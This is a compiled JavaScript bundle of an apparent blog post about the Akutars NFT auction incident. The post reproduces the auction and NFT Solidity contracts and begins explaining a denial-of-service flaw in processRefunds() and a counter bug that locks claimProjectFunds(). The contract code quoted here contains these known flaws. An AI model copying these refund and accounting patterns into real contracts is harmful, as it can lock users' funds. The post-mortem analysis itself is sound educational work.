i=h(k.current.type);M[i]||(f('Component \"%s\" contains the string ref \"%s\". Support for string refs will be removed in a future major release. This case cannot be automatically converted to an arrow function. We ask you to manually fix this case by using useRef() or createRef() instead. Learn more about using refs safely here: https://reactjs.org/link/strict-mode-string-ref',h(k.current.type),e.ref),M[i]=!0)}}function Ze(e,r){{var i=function(){be||(be=!0,f(\"%s: `key` is not a prop. Trying to access it will result in `undefined` being returned. If you need to access the same value within the child component, you should pass it as a different prop. (https://reactjs.org/link/special-props)\",r))};i.isReactWarning=!0,Object.defineProperty(e,\"key\",{get:i,configurable:!0})}}function Je(e,r){{var i=function(){fe||(fe=!0,f(\"%s: `ref` is not a prop. Trying to access it will result in `undefined` being returned. If you need to access the same value within the child component, you should pass it as a different prop. (https://reactjs.org/link/special-props)\",r))};i.isReactWarning=!0,Object.defineProperty(e,\"ref\",{get:i,configurable:!0})}}var en=function(e,r,i,s,d,l,a){var o={$$typeof:n,type:e,key:r,ref:i,props:a,_owner:l};return o._store={},Object.defineProperty(o._store,\"validated\",{configurable:!1,enumerable:!1,writable:!0,value:!1}),Object.defineProperty(o,\"_self\",{configurable:!1,enumerable:!1,writable:!1,value:s}),Object.defineProperty(o,\"_source\",{configurable:!1,enumerable:!1,writable:!1,value:d}),Object.freeze&&(Object.freeze(o.props),Object.freeze(o)),o};function nn(e,r,i,s,d){{var l,a={},o=null,_=null;i!==void 0&&(me(i),o=\"\"+i),Xe(r)&&(me(r.key),o=\"\"+r.key),Qe(r)&&(_=r.ref,Ke(r,d));for(l in r)D.call(r,l)&&!He.hasOwnProperty(l)&&(a[l]=r[l]);if(e&&e.defaultProps){var u=e.defaultProps;for(l in u)a[l]===void 0&&(a[l]=u[l])}if(o||_){var m=typeof e==\"function\"?e.displayName||e.name||\"Unknown\":e;o&&Ze(a,m),_&&Je(a,m)}return en(e,o,_,d,s,k.current,a)}}var L=w.ReactCurrentOwner,_e=w.ReactDebugCurrentFrame;function v(e){if(e){var r=e._owner,i=I(e.type,e._source,r?r.type:null);_e.setExtraStackFrame(i)}else _e.setExtraStackFrame(null)}var Y;Y=!1;function V(e){return typeof e==\"object\"&&e!==null&&e.$$typeof===n}function pe(){{if(L.current){var e=h(L.current.type);if(e)return`\n\nCheck the render method of \\``+e+\"`.\"}return\"\"}}function tn(e){{if(e!==void 0){var r=e.fileName.replace(/^.*[\\\\\\/]/,\"\"),i=e.lineNumber;return`\n\nCheck your code at `+r+\":\"+i+\".\"}return\"\"}}var he={};function rn(e){{var r=pe();if(!r){var i=typeof e==\"string\"?e:e.displayName||e.name;i&&(r=`\n\nCheck the top-level render call using <`+i+\">.\")}return r}}function xe(e,r){{if(!e._store||e._store.validated||e.key!=null)return;e._store.validated=!0;var i=rn(r);if(he[i])return;he[i]=!0;var s=\"\";e&&e._owner&&e._owner!==L.current&&(s=\" It was passed a child from \"+h(e._owner.type)+\".\"),v(e),f('Each child in a list should have a unique \"key\" prop.%s%s See https://reactjs.org/link/warning-keys for more information.',i,s),v(null)}}function ge(e,r){{if(typeof e!=\"object\")return;if(W(e))for(var i=0;i<e.length;i++){var s=e[i];V(s)&&xe(s,r)}else if(V(e))e._store&&(e._store.validated=!0);else if(e){var d=Ae(e);if(typeof d==\"function\"&&d!==e.entries)for(var l=d.call(e),a;!(a=l.next()).done;)V(a.value)&&xe(a.value,r)}}}function sn(e){{var r=e.type;if(r==null||typeof r==\"string\")return;var i;if(typeof r==\"function\")i=r.propTypes;else if(typeof r==\"object\"&&(r.$$typeof===T||r.$$typeof===R))i=r.propTypes;else return;if(i){var s=h(r);Ye(i,e.props,\"prop\",s,e)}else if(r.PropTypes!==void 0&&!Y){Y=!0;var d=h(r);f(\"Component %s declared `PropTypes` instead of `propTypes`. Did you misspell the property assignment?\",d||\"Unknown\")}typeof r.getDefaultProps==\"function\"&&!r.getDefaultProps.isReactClassApproved&&f(\"getDefaultProps is only used on classic React.createClass definitions. Use a static property named `defaultProps` instead.\")}}function on(e){{for(var r=Object.keys(e.props),i=0;i<r.length;i++){var s=r[i];if(s!==\"children\"&&s!==\"key\"){v(e),f(\"Invalid prop `%s` supplied to `React.Fragment`. React.Fragment can only have `key` and `children` props.\",s),v(null);break}}e.ref!==null&&(v(e),f(\"Invalid attribute `ref` supplied to `React.Fragment`.\"),v(null))}}function an(e,r,i,s,d,l){{var a=Fe(e);if(!a){var o=\"\";(e===void 0||typeof e==\"object\"&&e!==null&&Object.keys(e).length===0)&&(o+=\" You likely forgot to export your component from the file it's defined in, or you might have mixed up default and named imports.\");var _=tn(d);_?o+=_:o+=pe();var u;e===null?u=\"null\":W(e)?u=\"array\":e!==void 0&&e.$$typeof===n?(u=\"<\"+(h(e.type)||\"Unknown\")+\" />\",o=\" Did you accidentally export a JSX literal instead of a component?\"):u=typeof e,f(\"React.jsx: type is invalid -- expected a string (for built-in components) or a class/function (for composite components) but got: %s.%s\",u,o)}var m=nn(e,r,i,d,l);if(m==null)return m;if(a){var p=r.children;if(p!==void 0)if(s)if(W(p)){for(var j=0;j<p.length;j++)ge(p[j],e);Object.freeze&&Object.freeze(p)}else f(\"React.jsx: Static children should always be an array. You are likely explicitly calling React.jsxs or React.jsxDEV. Use the Babel transform instead.\");else ge(p,e)}return e===N?on(m):sn(m),m}}var dn=an;z.Fragment=N,z.jsxDEV=dn})()});var ke=$((Pn,Pe)=>{\"use strict\";Pe.exports=je()});var yn={};fn(yn,{default:()=>gn,frontmatter:()=>hn});var t=_n(ke()),hn={title:\"DDoS attack\",date:\"2023-05-10T00:00:00Z\",modifiedTime:\"2023-05-10T00:00:00Z\",summary:\"Akutar NFT incidand an example of DDoS attack from Ethernaut.\",image:\"blogs/blockchain/dos/cover.webp\",type:\"BlogPost\"};function Te(c){let n=Object.assign({h1:\"h1\",p:\"p\",a:\"a\",ul:\"ul\",li:\"li\",pre:\"pre\",code:\"code\",h2:\"h2\",strong:\"strong\",em:\"em\",ol:\"ol\"},c.components),{Annotation:b}=n;return b||Nn(\"Annotation\",!0,\"232:1-232:49\"),(0,t.jsxDEV)(t.Fragment,{children:[(0,t.jsxDEV)(n.h1,{children:'The Akutars project and 11.5K ETH \"burn\"'},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:10,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[(0,t.jsxDEV)(n.a,{href:\"https://www.aku.world\",children:\"Akutars\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:12,columnNumber:1},this),\" or AkuDreams was an NFT project launched in April 2022. The original Akutars' smart contracts are at:\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:12,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ul,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://etherscan.io/address/0xf42c318dbfbaab0eee040279c6a2588fa01a961d#code\",children:\"AkuAuction (auction contract)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:14,columnNumber:3},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:14,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:(0,t.jsxDEV)(n.a,{href:\"https://etherscan.io/address/0xaad35c2dadbe77f97301617d82e661776c891fa9#code\",children:\"Akutar (NFT contract)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:15,columnNumber:3},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:15,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:14,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`pragma solidity ^0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\ninterface akuNFT {\n  function airdropProgress() external view returns (uint256);\n}\n\ncontract AkuAuction is Ownable {\n  using Strings for uint256;\n\n  address payable immutable project;\n\n  uint256 public maxNFTs = 15000;\n  uint256 public totalForAuction = 5495; //529 + 2527 + 6449\n\n  struct bids {\n    address bidder;\n    uint80 price;\n    uint8 bidsPlaced;\n    uint8 finalProcess; //0: Not processed, 1: refunded, 2: withdrawn\n  }\n\n  uint256 private constant DURATION = 126 minutes;\n  uint256 public immutable startingPrice;\n  uint256 public immutable startAt;\n  uint256 public expiresAt;\n  uint256 public immutable discountRate;\n  mapping(address => uint256) public mintPassOwner;\n  uint256 public constant mintPassDiscount = 0.5 ether;\n  mapping(address => uint256) public personalBids;\n  mapping(uint256 => bids) public allBids;\n  uint256 public bidIndex = 1;\n  uint256 public totalBids;\n  uint256 public totalBidValue;\n  uint256 public maxBids = 3;\n  uint256 public refundProgress = 1;\n\n  akuNFT public akuNFTs;\n\n  constructor(\n    address _project,\n    uint256 startingTime,\n    uint256 _startingPrice,\n    uint256 _discountRate\n  ) {\n    project = payable(_project);\n\n    startingPrice = _startingPrice;\n    startAt = startingTime;\n    expiresAt = startAt + DURATION;\n    discountRate = _discountRate;\n\n    require(_startingPrice >= _discountRate * (DURATION / 6 minutes), \"Starting price less than minimum\");\n  }\n\n  function getPrice() public view returns (uint80) {\n    uint256 currentTime = block.timestamp;\n    if (currentTime > expiresAt) currentTime = expiresAt;\n    uint256 timeElapsed = (currentTime - startAt) / 6 minutes;\n    uint256 discount = discountRate * timeElapsed;\n    return uint80(startingPrice - discount);\n  }\n\n  function bid(uint8 amount) external payable {\n    _bid(amount, msg.value);\n  }\n\n  receive() external payable {\n    revert(\"Please use the bid function\");\n  }\n\n  function _bid(uint8 amount, uint256 value) internal {\n    require(block.timestamp > startAt, \"Auction not started yet\");\n    require(block.timestamp < expiresAt, \"Auction expired\");\n    uint80 price = getPrice();\n    uint256 totalPrice = price * amount;\n    if (value < totalPrice) {\n      revert(\"Bid not high enough\");\n    }\n\n    uint256 myBidIndex = personalBids[msg.sender];\n    bids memory myBids;\n    uint256 refund;\n\n    if (myBidIndex > 0) {\n      myBids = allBids[myBidIndex];\n      refund = myBids.bidsPlaced * (myBids.price - price);\n    }\n    uint256 _totalBids = totalBids + amount;\n    myBids.bidsPlaced += amount;\n\n    if (myBids.bidsPlaced > maxBids) {\n      revert(\"Bidding limits exceeded\");\n    }\n\n    if (_totalBids > totalForAuction) {\n      revert(\"Auction Full\");\n    } else if (_totalBids == totalForAuction) {\n      expiresAt = block.timestamp; //Auction filled\n    }\n\n    myBids.price = price;\n\n    if (myBidIndex > 0) {\n      allBids[myBidIndex] = myBids;\n    } else {\n      myBids.bidder = msg.sender;\n      personalBids[msg.sender] = bidIndex;\n      allBids[bidIndex] = myBids;\n      bidIndex++;\n    }\n\n    totalBids = _totalBids;\n    totalBidValue += totalPrice;\n\n    refund += value - totalPrice;\n    if (refund > 0) {\n      (bool sent, ) = msg.sender.call{ value: refund }(\"\");\n      require(sent, \"Failed to refund bidder\");\n    }\n  }\n\n  function loadMintPassOwners(address[] calldata owners, uint256[] calldata amounts) external onlyOwner {\n    for (uint256 i = 0; i < owners.length; i++) {\n      mintPassOwner[owners[i]] = amounts[i];\n    }\n  }\n\n  function myBidCount(address user) public view returns (uint256) {\n    return allBids[personalBids[user]].bidsPlaced;\n  }\n\n  function myBidData(address user) external view returns (bids memory) {\n    return allBids[personalBids[user]];\n  }\n\n  function setNFTContract(address _contract) external onlyOwner {\n    akuNFTs = akuNFT(_contract);\n  }\n\n  function emergencyWithdraw() external {\n    require(block.timestamp > expiresAt + 3 days, \"Please wait for airdrop period.\");\n\n    bids memory bidData = allBids[personalBids[msg.sender]];\n    require(bidData.bidsPlaced > 0, \"No bids placed\");\n    require(bidData.finalProcess == 0, \"Refund already processed\");\n\n    allBids[personalBids[msg.sender]].finalProcess = 2;\n    (bool sent, ) = bidData.bidder.call{ value: bidData.price * bidData.bidsPlaced }(\"\");\n    require(sent, \"Failed to refund bidder\");\n  }\n\n  function processRefunds() external {\n    require(block.timestamp > expiresAt, \"Auction still in progress\");\n    uint256 _refundProgress = refundProgress;\n    uint256 _bidIndex = bidIndex;\n    require(_refundProgress < _bidIndex, \"Refunds already processed\");\n\n    uint256 gasUsed;\n    uint256 gasLeft = gasleft();\n    uint256 price = getPrice();\n\n    for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {\n      bids memory bidData = allBids[i];\n      if (bidData.finalProcess == 0) {\n        uint256 refund = (bidData.price - price) * bidData.bidsPlaced;\n        uint256 passes = mintPassOwner[bidData.bidder];\n        if (passes > 0) {\n          refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);\n        }\n        allBids[i].finalProcess = 1;\n        if (refund > 0) {\n          (bool sent, ) = bidData.bidder.call{ value: refund }(\"\");\n          require(sent, \"Failed to refund bidder\");\n        }\n      }\n\n      gasUsed += gasLeft - gasleft();\n      gasLeft = gasleft();\n      _refundProgress++;\n    }\n\n    refundProgress = _refundProgress;\n  }\n\n  function claimProjectFunds() external onlyOwner {\n    require(block.timestamp > expiresAt, \"Auction still in progress\");\n    require(refundProgress >= totalBids, \"Refunds not yet processed\");\n    require(akuNFTs.airdropProgress() >= totalBids, \"Airdrop not complete\");\n\n    (bool sent, ) = project.call{ value: address(this).balance }(\"\");\n    require(sent, \"Failed to withdraw\");\n  }\n\n  function getAuctionDetails(address user)\n    external\n    view\n    returns (\n      uint256 remainingNFTs,\n      uint256 expires,\n      uint256 currentPrice,\n      uint256 userBids\n    )\n  {\n    remainingNFTs = totalForAuction - totalBids;\n    expires = expiresAt;\n    currentPrice = getPrice();\n    if (user != address(0)) userBids = allBids[personalBids[user]].bidsPlaced;\n  }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:17,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:17,columnNumber:1},this),`\n`,(0,t.jsxDEV)(b,{caption:\"Akutar Auction contract\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:232,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`//SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport \"@openzeppelin/contracts/access/Ownable.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/ERC721.sol\";\nimport \"@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol\";\nimport \"@openzeppelin/contracts/utils/Strings.sol\";\n\n/*\nAkutar.sol\n\nWritten by: mousedev.eth\nContributions by: manifold.xyz\nPublic Repository: https://github.com/mouse-dev-1/Akutar\n\n15,000 NFTs in 4 sections\n\n(6) ID 1-6 partner reserved NFTs\n\n(529) ID 7-535 Mega OG Akutars, randomly assigned to 529 Mega OG Mint Pass holders (addresses known)\n\n(2527) ID 536-3,062 OG Akutars, randomly assigned to 2,527 OG Mint Pass holders (addresses known)\n\n(11938) ID 3,063-15,000 Akutars, randomly assigned to 6,443 Mint Pass holders + 5495 public bids (addresses known)\n\n*/\n\ncontract Akutar is Ownable, ERC721, ERC721Burnable {\n    //Contract URI\n    string public CONTRACT_URI;\n\n    //Base URI\n    string public BASE_URI;\n\n    //Shift Quantity;\n    uint256 public shiftQuantity;\n\n    //Block to base randomness off of\n    uint256 blockToUse;\n\n    uint256 _totalSupply;\n\n    //Provenance hash\n    string public PROVENANCE_HASH;\n\n    //Struct to define a grouping of airdrops\n    struct Grouping {\n        uint256 startingIndex;\n        uint256 endingIndex;\n        uint256 minted;\n    }\n\n    //Mapping of groupingId to grouping struct.\n    mapping(uint256 => Grouping) public airdropGroupings;\n\n    // EIP2981\n    uint256 private _royaltyBps;\n    address payable private _royaltyRecipient;\n    bytes4 private constant _INTERFACE_ID_ROYALTIES_EIP2981 = 0x2a55205a;\n\n    constructor() ERC721(\"Akutars\", \"AKU\") {\n        //Partner\n        airdropGroupings[0] = Grouping(1, 7, 0);\n\n        //Mega OG\n        airdropGroupings[1] = Grouping(7, 536, 0);\n\n        //OG\n        airdropGroupings[2] = Grouping(536, 3063, 0);\n\n        //Normal\n        airdropGroupings[3] = Grouping(3063, 15001, 0);\n    }\n\n    /**\n     * @dev See {IERC165-supportsInterface}.\n     */\n    function supportsInterface(bytes4 interfaceId)\n        public\n        view\n        virtual\n        override(ERC721)\n        returns (bool)\n    {\n        return super.supportsInterface(interfaceId) || interfaceId == _INTERFACE_ID_ROYALTIES_EIP2981;\n    }\n\n    function airdrop(uint256 airdropGrouping, address[] memory addresses)\n        public\n        onlyOwner\n    {\n        require(shiftQuantity > 0, \"Not yet shifted!\");\n\n        Grouping memory thisGrouping = airdropGroupings[airdropGrouping];\n\n        //Total tokens in this grouping.\n        uint256 maxQuantityWithinThisGrouping = (thisGrouping.endingIndex -\n            thisGrouping.startingIndex);\n\n        //How much to shift within these constraints.\n        uint256 shiftQuantityWithinThisGrouping = shiftQuantity %\n            maxQuantityWithinThisGrouping;\n\n        //Index to currently start on.\n        uint256 startingIndexWithinThisGrouping = thisGrouping.startingIndex +\n            thisGrouping.minted +\n            shiftQuantityWithinThisGrouping;\n\n        require(\n            thisGrouping.minted + addresses.length <=\n                maxQuantityWithinThisGrouping,\n            \"Would overflow grouping\"\n        );\n\n        //Cast to thisId\n        uint256 currentId = startingIndexWithinThisGrouping;\n\n        for (uint256 i = 0; i < addresses.length; i++) {\n            //If we are over the endingIndex because of the shuffle, adjust to current position minus max quantity;\n            if (currentId >= thisGrouping.endingIndex)\n                currentId = currentId - maxQuantityWithinThisGrouping;\n\n            //Mint thisId\n            _mint(addresses[i], currentId);\n\n            //Increment ID by one.\n            currentId++;\n        }\n\n        _totalSupply += addresses.length;\n        airdropGroupings[airdropGrouping].minted += addresses.length;\n    }\n\n    function commit(string memory _provenanceHash) external onlyOwner {\n        //Require shift hasn't happened\n        require(blockToUse == 0, \"Already committed!\");\n\n        //Set the block to use as 5 blocks from now\n        blockToUse = block.number + 5;\n\n        //Set the provenance hash\n        PROVENANCE_HASH = _provenanceHash;\n    }\n\n    function reveal() external onlyOwner {\n        //Require they have committed\n        require(blockToUse != 0, \"You have yet to commit\");\n\n        //Require shift hasn't happened\n        require(shiftQuantity == 0, \"Already shifted!\");\n\n        //Require it is at or beyond blockToUse\n        require(\n            block.number >= blockToUse,\n            \"Not enough time has passed to reveal\"\n        );\n\n        //set shift quantity\n        shiftQuantity = uint256(blockhash(blockToUse));\n    }\n\n\n    function setBaseURI(string memory _baseURI) public onlyOwner {\n        BASE_URI = _baseURI;\n    }\n\n    function setContractURI(string memory _contractURI) public onlyOwner {\n        CONTRACT_URI = _contractURI;\n    }\n\n    function contractURI() public view returns (string memory) {\n        return CONTRACT_URI;\n    }\n\n    function totalSupply() public view returns (uint256) {\n        return _totalSupply;\n    }\n\n    function tokenURI(uint256 _tokenId)\n        public\n        view\n        override\n        returns (string memory)\n    {\n        require(_exists(_tokenId), \"Token does not exist.\");\n\n        return\n            string(\n                abi.encodePacked(BASE_URI, Strings.toString(_tokenId), \".json\")\n            );\n    }\n\n    /**\n     * ROYALTY FUNCTIONS\n     */\n    function updateRoyalties(address payable recipient, uint256 bps) external onlyOwner {\n        _royaltyRecipient = recipient;\n        _royaltyBps = bps;\n    }\n\n    function royaltyInfo(uint256, uint256 value) external view returns (address, uint256) {\n        return (_royaltyRecipient, value*_royaltyBps/10000);\n    }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:234,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:234,columnNumber:1},this),`\n`,(0,t.jsxDEV)(b,{caption:\"Akutar token (NFT) contract\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:441,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"In the auction contract, there was a software bug that make \",(0,t.jsxDEV)(n.code,{children:\"claimProjectFunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:443,columnNumber:61},this),` to be stuck forever.\nOn top of that, there also an error that could stop `,(0,t.jsxDEV)(n.code,{children:\"processRefunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:444,columnNumber:53},this),\" (hence Denial of Service or DoS).\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:443,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.h2,{children:\"Bug 01 - processRefunds\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:446,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.p,{children:[\"Let's look at the \",(0,t.jsxDEV)(n.code,{children:\"_bid()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:448,columnNumber:19},this),\" and \",(0,t.jsxDEV)(n.code,{children:\"processRefunds()\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:448,columnNumber:32},this),\" function below, the authors original intent is clearly to match:\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:448,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.ul,{children:[`\n`,(0,t.jsxDEV)(n.li,{children:[(0,t.jsxDEV)(n.code,{children:\"totalBids\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:450,columnNumber:3},this),\" => number of NFTs bidded during the auction.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:450,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[(0,t.jsxDEV)(n.code,{children:\"bidIndex\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:451,columnNumber:3},this),\" => index of bidder (0-indexed) for the auction.\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:451,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.li,{children:[(0,t.jsxDEV)(n.code,{children:\"refundProgress\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:452,columnNumber:3},this),\" => number of \",(0,t.jsxDEV)(n.strong,{children:\"people (tracked by bidIndex)\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:452,columnNumber:33},this),\" have refunded so far\"]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:452,columnNumber:1},this),`\n`]},void 0,!0,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:450,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`function _bid(uint8 amount, uint256 value) internal {\n  require(block.timestamp > startAt, \"Auction not started yet\");\n  require(block.timestamp < expiresAt, \"Auction expired\");\n  uint80 price = getPrice();\n  uint256 totalPrice = price * amount;\n  if (value < totalPrice) {\n    revert(\"Bid not high enough\");\n  }\n\n  uint256 myBidIndex = personalBids[msg.sender];\n  bids memory myBids;\n  uint256 refund;\n\n  if (myBidIndex > 0) {\n    myBids = allBids[myBidIndex];\n    refund = myBids.bidsPlaced * (myBids.price - price);\n  }\n  uint256 _totalBids = totalBids + amount;\n  myBids.bidsPlaced += amount;\n\n  if (myBids.bidsPlaced > maxBids) {\n    revert(\"Bidding limits exceeded\");\n  }\n\n  if (_totalBids > totalForAuction) {\n    revert(\"Auction Full\");\n  } else if (_totalBids == totalForAuction) {\n    expiresAt = block.timestamp; //Auction filled\n  }\n\n  myBids.price = price;\n\n  if (myBidIndex > 0) {\n    allBids[myBidIndex] = myBids;\n  } else {\n    myBids.bidder = msg.sender;\n    personalBids[msg.sender] = bidIndex;\n    allBids[bidIndex] = myBids;\n    bidIndex++;\n  }\n\n  totalBids = _totalBids;\n  totalBidValue += totalPrice;\n\n  refund += value - totalPrice;\n  if (refund > 0) {\n    (bool sent, ) = msg.sender.call{ value: refund }(\"\");\n    require(sent, \"Failed to refund bidder\");\n  }\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:454,columnNumber:1},this)},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:454,columnNumber:1},this),`\n`,(0,t.jsxDEV)(b,{caption:\"bid function [line 75]\"},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:507,columnNumber:1},this),`\n`,(0,t.jsxDEV)(n.pre,{children:(0,t.jsxDEV)(n.code,{className:\"language-solidity\",children:`function processRefunds() external {\n  require(block.timestamp > expiresAt, \"Auction still in progress\");\n  uint256 _refundProgress = refundProgress;\n  uint256 _bidIndex = bidIndex;\n  require(_refundProgress < _bidIndex, \"Refunds already processed\");\n\n  uint256 gasUsed;\n  uint256 gasLeft = gasleft();\n  uint256 price = getPrice();\n\n  for (uint256 i = _refundProgress; gasUsed < 5000000 && i < _bidIndex; i++) {\n    bids memory bidData = allBids[i];\n    if (bidData.finalProcess == 0) {\n      uint256 refund = (bidData.price - price) * bidData.bidsPlaced;\n      uint256 passes = mintPassOwner[bidData.bidder];\n      if (passes > 0) {\n        refund += mintPassDiscount * (bidData.bidsPlaced < passes ? bidData.bidsPlaced : passes);\n      }\n      allBids[i].finalProcess = 1;\n      if (refund > 0) {\n        (bool sent, ) = bidData.bidder.call{ value: refund }(\"\");\n        require(sent, \"Failed to refund bidder\");\n      }\n    }\n\n    gasUsed += gasLeft - gasleft();\n    gasLeft = gasleft();\n    _refundProgress++;\n  }\n\n  refundProgress = _refundProgress;\n}\n`},void 0,!1,{fileName:\"/home/phi/side_projects/personal-website/mdx_contents/blog/smart_contract/_mdx_bundler_entry_point-c6865e63-e263-4954-adf0-b7f6becdb5d5.mdx\",lineNumber:509,columnNumber:1},this)},void 